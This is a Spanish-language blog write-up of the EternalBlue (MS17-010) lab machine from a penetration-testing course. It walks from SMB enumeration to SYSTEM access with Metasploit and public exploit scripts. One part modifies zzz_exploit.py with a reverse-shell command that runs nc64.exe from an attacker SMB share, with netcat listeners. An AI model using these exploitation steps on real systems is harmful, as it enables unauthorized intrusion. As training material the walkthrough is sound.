---
title: Blue - Practical Ethical Hacking
categories: [Windows]
published: true
lang: es
---

![Info Card](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/1.png){:class="blog-image" onclick="expandImage(this)"}

Hoy vamos a resolver la máquina _Blue_ del curso [Practical Ethical Hacking](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) de TCM Security. Esta máquina forma parte del capstone intermedio del curso, y en este write-up me enfocaré en cubrir varias técnicas de explotación y escalada de privilegios, desde el reconocimiento inicial hasta la obtención de privilegios de administrador.

El objetivo de este artículo es reforzar lo aprendido hasta ahora, pero también ofrecer una guía más completa, explorando distintos enfoques y metodologías que podrían ser útiles para quienes buscan profundizar más en el proceso.

### [](#header-3)Fase de Reconocimiento

Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está activa.

```
ping -c 1 <IP del host>
```

![2](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/2.png){:class="blog-image" onclick="expandImage(this)"}

Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `128`, por lo que podemos intuir que estamos ante una máquina _Windows_. Recordemos que algunos de los valores referenciales son los siguientes:

| Sistema Operativo (OS) | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n <IP del host>
```

En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP del host>
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.

```bash
nmap -sC -sV -p 135,139,445,49152,49153,49154,49155,49157 <IP del host>
```

A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Basándonos en la información que nos reporta _Nmap_, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con `RPC` (135), `NetBIOS` (139) y `SMB` (445).

#### [](#header-4)Servicio SMB

Tenemos varias opciones para enumerar el servicio `SMB`. Lo que nos interesa como atacantes es identificar los dialectos soportados por el servidor, verificar si el firmado del _SMB_ está habilitado o es requerido, determinar el nivel de autenticación permitido y confirmar la versión exacta del sistema operativo. Todos estos elementos nos permitirán evaluar posibles vectores de explotación.

##### [](#header-5)NetExec

Una de las herramientas más completas para esta tarea es `NetExec`, ya que nos permite obtener la mayoría de esta información mediante un solo comando. Bastará con especificar el protocolo que queremos utilizar y la dirección IP de la máquina víctima:

```
nxc smb <IP del host>
```

![3](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/3.png){:class="blog-image" onclick="expandImage(this)"}

Rápidamente podemos determinar que estamos frente a un _Windows 7 Ultimate 7601 Service Pack 1_ de _64 bits_. Además, podemos observar que el firmado del _SMB_ no es requerido en este host. En un entorno de `Active Directory`, esta configuración podría dar lugar a ataques como `NTLM Relay`; sin embargo, en este escenario particular no representa un vector de ataque relevante.

En cuanto a los dialectos soportados, podemos ver que `SMBv1` se encuentra habilitado, por lo que el host podría ser vulnerable a `EternalBlue`, siempre que el sistema no haya sido debidamente parcheado.

Por último, podemos observar que las _null sessions_ están habilitadas. Esto permite establecer una sesión anónima contra el servicio `SMB`, lo cual facilita la enumeración de recursos compartidos y, dependiendo de los permisos configurados, podría permitir la interacción con dichos recursos, en caso de que existan privilegios de lectura o escritura.

##### [](#header-5)Nmap

Si quisiéramos seguir enumerando con `Nmap` podríamos hacerlo, pero esta vez lanzando una serie de scripts de descubrimiento específicos. El parámetro `-sC` que utilizamos anteriormente durante nuestro escaneo de versiones y servicios, ejecuta por defecto los scripts `smb2-security-mode`, `smb-security-mode` y `smb-os-discovery`. Si obtenemos una respuesta del script `smb-security-mode`, podemos inferir que `SMBv1` está habilitado. No obstante, si queremos estar completamente seguros de los dialectos soportados, podemos incluir el script `smb-protocols`:

```bash
nmap --script smb-protocols,smb2-security-mode,smb-security-mode,smb-os-discovery -p 139,445 <IP del host>
```

![4](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/4.png){:class="blog-image" onclick="expandImage(this)"}

Los resultados son consistentes con los obtenidos previamente con _NetExec_, permitiéndonos validar los hallazgos mediante una segunda herramienta.

##### [](#header-5)Metasploit

Finalmente, como alternativa, podemos usar `Metasploit` para enumerar el servicio `SMB` mediante el módulo auxiliar `smb_version`:

```
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOST <IP del host>
run
```

![5](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/5.png){:class="blog-image" onclick="expandImage(this)"}

Una vez ejecutado, podemos corroborar los hallazgos previamente identificados, reforzando la consistencia del análisis.

![6](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/6.png){:class="blog-image" onclick="expandImage(this)"}

#### [](#header-4)SMB Shares

Con toda esta información en mente, podemos profundizar aún más en el servicio `SMB`. Dado que las _null sessions_ están habilitadas, podemos establecer una sesión anónima contra el servidor e intentar enumerar recursos compartidos a nivel de red y, en caso de que los permisos lo permitan, interactuar con ellos. Para esta tarea utilizaremos `SMBMap`:

```bash
smbmap -H <IP del host>
```

![7](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/7.png){:class="blog-image" onclick="expandImage(this)"}

En este caso, únicamente podemos listar los recursos existentes, ya que no contamos con permisos suficientes para interactuar con ellos.

#### [](#header-4)EternalBlue

Esto nos deja con un último vector potencial a evaluar: determinar si la implementación de `SMBv1` presente en el sistema se encuentra sin parchear y, por lo tanto, es vulnerable a `MS17-010` (`EternalBlue`). Para verificar la presencia de esta vulnerabilidad, utilizaremos dos herramientas distintas.

##### [](#header-5)Nmap

Podemos continuar utilizando scripts de descubrimiento de `Nmap`, esta vez orientados a la detección de vulnerabilidades. En este caso, emplearemos el script `smb-vuln-ms17-010` para comprobar si el host es susceptible a esta vulnerabilidad:

```bash
nmap --script smb-vuln-ms17-010 -p 445 <IP del host>
```

![8](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/8.png){:class="blog-image" onclick="expandImage(this)"}

El resultado del escaneo indica que el host es vulnerable a `MS17-010`, lo que sugiere que la explotación podría ser viable.

##### [](#header-5)Metasploit

Alternativamente, podemos utilizar `Metasploit`. El módulo `ms17_010_eternalblue` incluye una función `check` que permite validar si el sistema es vulnerable antes de proceder con la explotación:

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP del host>
check
```

En su defecto, podemos utilizar directamente el módulo auxiliar subyacente encargado únicamente de la comprobación:

```
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOST <IP del host>
run
```

![9](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/9.png){:class="blog-image" onclick="expandImage(this)"}

Al igual que con _Nmap_, confirmamos que el host es vulnerable a `MS17-010`, lo que refuerza la viabilidad de la explotación.

![10](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/10.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Fase de Explotación

Una vez confirmamos que el sistema es vulnerable a `MS17-010` (`EternalBlue`), el siguiente paso consiste en intentar su explotación con el objetivo de obtener _ejecución remota de código_ (RCE) en la máquina víctima.

Antes de continuar, me gustaría comentar brevemente la metodología que seguiremos. Las herramientas automatizadas simplifican considerablemente el proceso de explotación y permiten obtener resultados de forma rápida. Sin embargo, comprender cómo y por qué funciona la vulnerabilidad nos da un mayor control sobre el proceso y nos ayuda a entender qué está ocurriendo en cada etapa.

Por este motivo, abordaremos ambos enfoques: por un lado, la explotación automatizada y, por otro, la explotación manual. No obstante, pondremos especial énfasis en esta última, ya que nos permite profundizar en el funcionamiento interno del fallo y desarrollar una base técnica más sólida. Este enfoque resulta especialmente útil en contextos formativos y certificaciones como la _Offensive Security Certified Professional_, donde el uso de herramientas automatizadas se encuentra restringido.

#### [](#header-4)Explotación Automatizada

Para realizar la explotación automatizada utilizaremos `Metasploit`. En concreto, emplearemos el mismo módulo que utilizamos previamente para comprobar si el host era susceptible a `MS17‑010` (`EternalBlue`).

La diferencia es que, en esta ocasión, en lugar de ejecutar la función _check_, lanzaremos directamente el exploit con el objetivo de obtener _ejecución remota de código_ (RCE) sobre la máquina víctima.

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP del host>
exploit
```

![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/11.png){:class="blog-image" onclick="expandImage(this)"}

La ejecución del módulo nos devuelve una sesión `Meterpreter` desde la cual podemos interactuar con el sistema comprometido. Desde esta sesión es posible invocar una shell interactiva. 

```
shell
```

![12](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/12.png){:class="blog-image" onclick="expandImage(this)"}

Al verificar el contexto de ejecución, observamos que el proceso se ejecuta como `NT AUTHORITY\SYSTEM`, es decir, con los máximos privilegios del sistema. Por tanto, no es necesario realizar ninguna escalada de privilegios adicional.

De esta forma, habremos explotado satisfactoriamente la vulnerabilidad y obtenido control completo sobre la máquina víctima.

#### [](#header-4)Explotación Manual

A diferencia del enfoque anterior, en esta ocasión asumiremos progresivamente un mayor grado de control sobre el proceso de explotación, trabajando directamente con distintas implementaciones de `MS17-010`.

##### [](#header-5)Win7Blue

La primera implementación con la que trabajaremos será `Win7Blue`, desarrollada por el usuario [d4t4s3c](https://github.com/d4t4s3c). Dado que previamente realizamos una enumeración exhaustiva del servicio `SMB` y determinamos la versión exacta del sistema operativo, sabemos que esta implementación, diseñada específicamente para _Windows 7_, se ajusta a la versión que identificamos.

Comenzaremos clonando el repositorio:

```bash
git clone https://github.com/d4t4s3c/Win7Blue
```

Una vez clonado el proyecto, nos situamos dentro del directorio y ejecutamos el script:

```bash
bash Win7Blue
```

Desde el menú interactivo indicaremos la arquitectura del sistema (en nuestro caso, `64 bits`, algo que ya habíamos identificado durante la fase de enumeración), la dirección IP de la máquina víctima, nuestra dirección IP y el puerto en el que nos pondremos en escucha.

El propio script se encarga de generar el `shellcode` utilizando `MSFvenom`. Antes de lanzar la explotación, pausará la ejecución para que confirmemos que estamos en escucha con `Netcat`, proporcionándonos incluso el comando necesario, que ejecutaremos en una nueva terminal:

```bash
nc -nlvp 443
```

Una vez confirmada la escucha y continuada la ejecución, el exploit se ejecutará y obtendremos una shell interactiva dentro de la máquina víctima.

![13](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/13.png){:class="blog-image" onclick="expandImage(this)"}

##### [](#header-5)AutoBlue

La segunda implementación con la que trabajaremos será `AutoBlue`, desarrollada por el usuario [3ndG4me](https://github.com/3ndG4me/). A diferencia de la implementación anterior, en este caso primero generaremos el `shellcode` y posteriormente ejecutaremos el exploit.

Comenzaremos clonando el repositorio:

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
```

Una vez clonado el proyecto, nos situamos dentro del directorio y accedemos a la carpeta _shellcode_, donde ejecutaremos el script `shell_prep.sh`:

```bash
./shell_prep.sh
```

Desde el menú interactivo seleccionaremos la opción para generar el `shellcode` con `MSFvenom`. Indicaremos nuestra dirección IP y, dado que el script no detecta automáticamente la arquitectura del sistema objetivo, nos solicitará el puerto en el que nos pondremos en escucha tanto para _64 bits_ como para 32 bits. Asimismo, seleccionaremos la opción para generar una shell interactiva en lugar de una sesión _Meterpreter_ y especificaremos que el payload sea de tipo _stageless_.

![14](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/14.png){:class="blog-image" onclick="expandImage(this)"}

Una vez generado el _shellcode_, regresamos al directorio principal. Antes de ejecutar el exploit, debemos ponernos en escucha en el puerto previamente configurado, desde una nueva terminal:

```bash
nc -nlvp 443
```

Con el _listener_ activo, ejecutamos `eternalblue_exploit7.py`. Dado que previamente realizamos una enumeración exhaustiva, sabemos que esta implementación se ajusta a la versión que identificamos.

Utilizaremos únicamente el `shellcode` de _64 bits_, ya que corresponde a la arquitectura que identificamos; de lo contrario, el uso de una arquitectura incompatible puede provocar fallos inesperados como reinicios o pantallazos azules (BSOD).

```bash
python eternalblue_exploit7.py <IP del host> shellcode/sc_x64.bin
```

![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/15.png){:class="blog-image" onclick="expandImage(this)"}


##### [](#header-5)MS17-010

La última implementación con la que trabajaremos será la disponible en el repositorio `MS17-010`, desarrollada por el usuario [worawit](https://github.com/worawit). Dentro del repositorio se encuentra el script _eternalblue_exploit7.py_, que es el que utilizan de forma subyacente las dos implementaciones anteriores. Aunque podríamos utilizarlo junto con un _shellcode_ personalizado, en esta ocasión no será el script que utilizaremos.

El script que emplearemos será `zzz_exploit.py`, que ofrece un enfoque más flexible y manual del proceso de explotación.

A diferencia de las implementaciones anteriores, este script no está configurado para enviar automáticamente una _reverse shell_ ni para ejecutar un payload predefinido. En su lugar, nos proporciona un mayor control sobre la sesión _SMB_ establecida, permitiéndonos modificar el comportamiento del exploit según nuestras necesidades. El código incluye secciones comentadas que pueden adaptarse para ejecutar comandos o payloads personalizados mediante la función `service_exec()`.

Comenzaremos clonando el repositorio:

```bash
git clone https://github.com/worawit/MS17-010
```

Una vez clonado el proyecto, nos situamos dentro del directorio. En primer lugar, ejecutaremos el script `checker.py` para identificar los `named pipes` disponibles en la máquina víctima:

```bash
python2 checker.py
```

![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/16.png){:class="blog-image" onclick="expandImage(this)"}

Aunque las _null sessions_ están habilitadas, será necesario editar el script para especificar un usuario válido, por ejemplo `guest`. No será necesario indicar contraseña. Una vez realizado este ajuste, ejecutaremos nuevamente el script y se nos mostrarán los `named pipes` disponibles que podremos utilizar durante la explotación.

![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/17.png){:class="blog-image" onclick="expandImage(this)"}

![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/18.png){:class="blog-image" onclick="expandImage(this)"}

Por defecto, el script `zzz_exploit.py` crea un archivo pwned.txt en la máquina víctima, lo cual no nos resulta especialmente útil. Lo que haremos ahora será modificar este script, concretamente la función `smb_pwn()`.

En primer lugar, especificaremos un usuario válido, de forma similar a como hicimos previamente con `checker.py`.

![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/19.png){:class="blog-image" onclick="expandImage(this)"}

A continuación, comentaremos las líneas relacionadas con la creación del archivo y habilitaremos la llamada a `service_exec()`, adaptándola a nuestras necesidades.

A diferencia de las implementaciones anteriores, en esta ocasión no generaremos ningún _shellcode_. En su lugar, levantaremos un recurso compartido en nuestra máquina atacante utilizando el script `smbserver` de la suite `Impacket`. A través de este recurso compartido expondremos el binario de `Netcat` de `64 bits`, de modo que la máquina víctima pueda ejecutarlo directamente desde nuestro recurso compartido y establecer una `reverse shell` hacia nuestro sistema.

Para conseguir esto, la llamada a `service_exec()` quedará de la siguiente forma:

```python
service_exec(conn, r'cmd /c \\<IP local>\smbFolder\nc64.exe -e cmd <IP local> 443')
```

![20](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/20.png){:class="blog-image" onclick="expandImage(this)"}

Una vez modificado el script, el siguiente paso será descargar el binario de [Netcat](https://eternallybored.org/misc/netcat/) que vamos a compartir.

Con el binario ubicado en nuestro directorio de trabajo, desde una nueva terminal crearemos el recurso compartido mediante `smbserver`:

```bash
impacket-smbserver smbFolder . -smb2support
```

Finalmente, desde otra terminal nos pondremos en escucha con `Netcat`:

```bash
nc -nlvp 443
```

Con el recurso compartido activo y el listener en ejecución, lanzaremos el exploit indicando uno de los `named pipes` identificados anteriormente al ejecutar `checker.py`:

```bash
python2 zzz_exploit.py <IP del host> samr
```

De esta forma, obtendremos una shell interactiva dentro de la máquina víctima con privilegios máximos, ejecutándose como `NT AUTHORITY\SYSTEM`.

![21](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/21.png){:class="blog-image" onclick="expandImage(this)"}
